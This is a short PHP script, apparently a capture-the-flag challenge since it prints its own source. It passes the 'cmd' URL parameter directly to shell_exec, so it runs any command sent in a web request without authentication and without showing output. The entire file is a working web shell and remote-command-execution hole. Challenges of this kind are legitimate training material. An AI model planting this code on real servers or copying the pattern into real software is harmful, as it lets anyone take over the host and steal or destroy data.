<?php
highlight_file(__FILE__);

if (isset($_GET['cmd'])) {
    shell_exec($_GET['cmd']);
}
